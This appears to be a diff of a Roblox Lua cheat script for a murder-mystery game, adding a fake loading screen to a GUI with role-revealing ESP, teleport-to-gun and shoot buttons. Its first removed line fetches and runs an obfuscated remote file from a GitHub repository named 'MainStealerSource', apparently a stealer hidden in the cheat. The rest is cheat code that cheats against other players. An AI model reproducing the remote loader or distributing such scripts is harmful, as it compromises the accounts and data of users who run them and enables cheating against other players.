@@ -1,5 +1,3 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/hubsrblx/MainStealerSource/refs/heads/main/SourceObf.txt')))()
-
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
@@ -14,7 +12,67 @@ ScreenGui.Name = "MobileMurderTerminator"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
--- Основное окно (правый верхний угол)
+-- Экран загрузки
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Name = "LoadingFrame"
+LoadingFrame.Size = UDim2.new(0, 140, 0, 80)
+LoadingFrame.Position = UDim2.new(1, -150, 0, 10)
+LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+LoadingFrame.BackgroundTransparency = 0.2
+LoadingFrame.BorderSizePixel = 0
+LoadingFrame.Visible = true
+LoadingFrame.Parent = ScreenGui
+
+local LoadingCorner = Instance.new("UICorner")
+LoadingCorner.CornerRadius = UDim.new(0, 12)
+LoadingCorner.Parent = LoadingFrame
+
+local LoadingTitle = Instance.new("TextLabel")
+LoadingTitle.Name = "LoadingTitle"
+LoadingTitle.Text = "JohnScript Aim 1.0"
+LoadingTitle.Size = UDim2.new(1, 0, 0, 25)
+LoadingTitle.Position = UDim2.new(0, 0, 0, 0)
+LoadingTitle.BackgroundTransparency = 1
+LoadingTitle.TextColor3 = Color3.fromRGB(255, 80, 80)
+LoadingTitle.Font = Enum.Font.GothamBold
+LoadingTitle.TextSize = 14
+LoadingTitle.Parent = LoadingFrame
+
+local LoadingText = Instance.new("TextLabel")
+LoadingText.Name = "LoadingText"
+LoadingText.Text = "LOADING..."
+LoadingText.Size = UDim2.new(1, 0, 0, 20)
+LoadingText.Position = UDim2.new(0, 0, 0.5, 0)
+LoadingText.BackgroundTransparency = 1
+LoadingText.TextColor3 = Color3.fromRGB(200, 200, 200)
+LoadingText.Font = Enum.Font.Gotham
+LoadingText.TextSize = 12
+LoadingText.Parent = LoadingFrame
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Name = "ProgressBar"
+ProgressBar.Size = UDim2.new(0.8, 0, 0, 8)
+ProgressBar.Position = UDim2.new(0.1, 0, 0.8, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+ProgressBar.BorderSizePixel = 0
+ProgressBar.Parent = LoadingFrame
+
+local ProgressBarCorner = Instance.new("UICorner")
+ProgressBarCorner.CornerRadius = UDim.new(0, 4)
+ProgressBarCorner.Parent = ProgressBar
+
+local ProgressFill = Instance.new("Frame")
+ProgressFill.Name = "ProgressFill"
+ProgressFill.Size = UDim2.new(0, 0, 1, 0)
+ProgressFill.BackgroundColor3 = Color3.fromRGB(40, 180, 40)
+ProgressFill.BorderSizePixel = 0
+ProgressFill.Parent = ProgressBar
+
+local ProgressFillCorner = Instance.new("UICorner")
+ProgressFillCorner.CornerRadius = UDim.new(0, 4)
+ProgressFillCorner.Parent = ProgressFill
+
+-- Основное окно (скрыто до окончания загрузки)
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Size = UDim2.new(0, 140, 0, 80)
@@ -22,6 +80,7 @@ MainFrame.Position = UDim2.new(1, -150, 0, 10)
 MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
 MainFrame.BackgroundTransparency = 0.2
 MainFrame.BorderSizePixel = 0
+MainFrame.Visible = false
 MainFrame.Parent = ScreenGui
 
 local UICorner = Instance.new("UICorner")
@@ -85,7 +144,7 @@ local MainSliderCorner = Instance.new("UICorner")
 MainSliderCorner.CornerRadius = UDim.new(0, 4)
 MainSliderCorner.Parent = MainSlider
 
--- Окно для кнопки SHOOT (справа)
+-- Окно для кнопки SHOOT (справа) - скрыто до загрузки
 local ShootFrame = Instance.new("Frame")
 ShootFrame.Name = "ShootFrame"
 ShootFrame.Size = UDim2.new(0, 60, 0, 60)
@@ -93,6 +152,7 @@ ShootFrame.Position = UDim2.new(0.8, -30, 0.5, -30)
 ShootFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
 ShootFrame.BackgroundTransparency = 0.2
 ShootFrame.BorderSizePixel = 0
+ShootFrame.Visible = false
 ShootFrame.Parent = ScreenGui
 
 local ShootFrameCorner = Instance.new("UICorner")
@@ -129,11 +189,11 @@ local ShootSliderCorner = Instance.new("UICorner")
 ShootSliderCorner.CornerRadius = UDim.new(0, 4)
 ShootSliderCorner.Parent = ShootSlider
 
--- Окно для кнопки GET GUN (справа рядом с SHOOT)
+-- Окно для кнопки GET GUN (справа рядом с SHOOT) - скрыто до загрузки
 local GetGunFrame = Instance.new("Frame")
 GetGunFrame.Name = "GetGunFrame"
 GetGunFrame.Size = UDim2.new(0, 60, 0, 60)
-GetGunFrame.Position = UDim2.new(0.8, -100, 0.5, -30)  -- Сдвинуто влево на 70px
+GetGunFrame.Position = UDim2.new(0.8, -100, 0.5, -30)
 GetGunFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
 GetGunFrame.BackgroundTransparency = 0.2
 GetGunFrame.BorderSizePixel = 0
@@ -174,7 +234,36 @@ local GetGunSliderCorner = Instance.new("UICorner")
 GetGunSliderCorner.CornerRadius = UDim.new(0, 4)
 GetGunSliderCorner.Parent = GetGunSlider
 
--- Функция для перемещения окон
+-- Анимация загрузки
+local loadStartTime = tick()
+local loadDuration = 20 -- 20 секунд
+
+local function updateProgress()
+    local elapsed = tick() - loadStartTime
+    local progress = math.min(elapsed / loadDuration, 1)
+    
+    ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
+    LoadingText.Text = string.format("LOADING... %d%%", math.floor(progress * 100))
+    
+    if progress < 1 then
+        return true
+    else
+        -- Завершение загрузки
+        LoadingFrame.Visible = false
+        MainFrame.Visible = true
+        ShootFrame.Visible = true
+        return false
+    end
+end
+
+-- Запуск процесса загрузки
+coroutine.wrap(function()
+    while updateProgress() do
+        RunService.RenderStepped:Wait()
+    end
+end)()
+
+-- Функция для перемещения окон (после загрузки)
 local function makeDraggable(frame, slider)
     local dragging, dragStart, startPos
     
@@ -202,25 +291,31 @@ local function makeDraggable(frame, slider)
     end)
 end
 
--- Делаем все окна перемещаемыми
-makeDraggable(MainFrame, MainSlider)
-makeDraggable(ShootFrame, ShootSlider)
-makeDraggable(GetGunFrame, GetGunSlider)
+-- Делаем все окна перемещаемыми после загрузки
+coroutine.wrap(function()
+    while LoadingFrame.Visible do
+        wait(0.1)
+    end
+    
+    makeDraggable(MainFrame, MainSlider)
+    makeDraggable(ShootFrame, ShootSlider)
+    makeDraggable(GetGunFrame, GetGunSlider)
+    
+    -- Эффекты при наведении на кнопки
+    local function setupButtonHover(button, normalColor, hoverColor)
+        button.MouseEnter:Connect(function()
+            TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = hoverColor}):Play()
+        end)
+        button.MouseLeave:Connect(function()
+            TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = normalColor}):Play()
+        end)
+    end
 
--- Эффекты при наведении на кнопки
-local function setupButtonHover(button, normalColor, hoverColor)
-    button.MouseEnter:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = hoverColor}):Play()
-    end)
-    button.MouseLeave:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.1), {BackgroundColor3 = normalColor}):Play()
-    end)
-end
-
-setupButtonHover(ShootButton, Color3.fromRGB(180, 40, 40), Color3.fromRGB(200, 50, 50))
-setupButtonHover(Toggle, Color3.fromRGB(60, 60, 60), Color3.fromRGB(80, 80, 80))
-setupButtonHover(EspToggle, Color3.fromRGB(60, 60, 60), Color3.fromRGB(80, 80, 80))
-setupButtonHover(GetGunButton, Color3.fromRGB(40, 100, 180), Color3.fromRGB(60, 140, 220))
+    setupButtonHover(ShootButton, Color3.fromRGB(180, 40, 40), Color3.fromRGB(200, 50, 50))
+    setupButtonHover(Toggle, Color3.fromRGB(60, 60, 60), Color3.fromRGB(80, 80, 80))
+    setupButtonHover(EspToggle, Color3.fromRGB(60, 60, 60), Color3.fromRGB(80, 80, 80))
+    setupButtonHover(GetGunButton, Color3.fromRGB(40, 100, 180), Color3.fromRGB(60, 140, 220))
+end)()
 
 -- Система авто-подбора оружия
 local AutoGetGun = { 
@@ -308,7 +403,7 @@ local function teleportToGunAndBack()
     GetGunButton.BackgroundColor3 = Color3.fromRGB(40, 100, 180)
 end
 
--- Логика переключателя авто-подбора
+-- Логика переключателя авто-подбора (после загрузки)
 Toggle.MouseButton1Click:Connect(function()
     AutoGetGun.Enabled = not AutoGetGun.Enabled
     Toggle.Text = AutoGetGun.Enabled and "Get Gun [ON]" or "Get Gun [OFF]"
@@ -316,12 +411,12 @@ Toggle.MouseButton1Click:Connect(function()
     GetGunFrame.Visible = AutoGetGun.Enabled
 end)
 
--- Логика кнопки GET GUN
+-- Логика кнопки GET GUN (после загрузки)
 GetGunButton.MouseButton1Click:Connect(function()
     teleportToGunAndBack()
 end)
 
--- Логика кнопки SHOOT
+-- Логика кнопки SHOOT (после загрузки)
 ShootButton.MouseButton1Click:Connect(function()
     -- Анимация нажатия
     TweenService:Create(ShootButton, TweenInfo.new(0.1), {Size = UDim2.new(0.75, 0, 0.75, 0), TextSize = 13}):Play()
@@ -547,7 +642,7 @@ function IsAlive(Player)
     return false
 end
 
--- Логика кнопки ESP
+-- Логика кнопки ESP (после загрузки)
 EspToggle.MouseButton1Click:Connect(function()
     ESP.Enabled = not ESP.Enabled
     EspToggle.Text = ESP.Enabled and "ESP [ON]" or "ESP [OFF]"
@@ -560,9 +655,11 @@ EspToggle.MouseButton1Click:Connect(function()
     UpdateHighlights()
 end)
 
--- Основной цикл ESP
+-- Основной цикл ESP (после загрузки)
 local lastRoleUpdate = 0
 RunService.RenderStepped:Connect(function()
+    if LoadingFrame.Visible then return end
+    
     -- Обновление ролей
     if tick() - lastRoleUpdate > 1 then
         roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
@@ -571,3 +668,39 @@ RunService.RenderStepped:Connect(function()
                 Murder = i
             elseif v.Role == 'Sheriff' then
                 Sheriff = i
+            elseif v.Role == 'Hero' then
+                Hero = i
+            end
+        end
+        lastRoleUpdate = tick()
+    end
+    
+    -- Полное обновление ESP каждые 10 секунд
+    if ESP.Enabled and tick() - ESP.LastFullUpdate > 10 then
+        FullESPUpdate()
+    end
+    
+    -- Обработка новых игроков
+    if ESP.Enabled then
+        for _, player in pairs(Players:GetPlayers()) do
+            if not ESP.PlayerHighlights[player] then
+                CreatePlayerHighlight(player)
+            end
+        end
+        UpdateHighlights()
+    end
+end)
+
+-- Обработка новых игроков
+Players.PlayerAdded:Connect(function(player)
+    if ESP.Enabled then
+        CreatePlayerHighlight(player)
+    end
+end)
+
+-- Очистка при выходе
+Players.PlayerRemoving:Connect(function(player)
+    if player == LocalPlayer then
+        ClearAllHighlights()
+    end
+end)
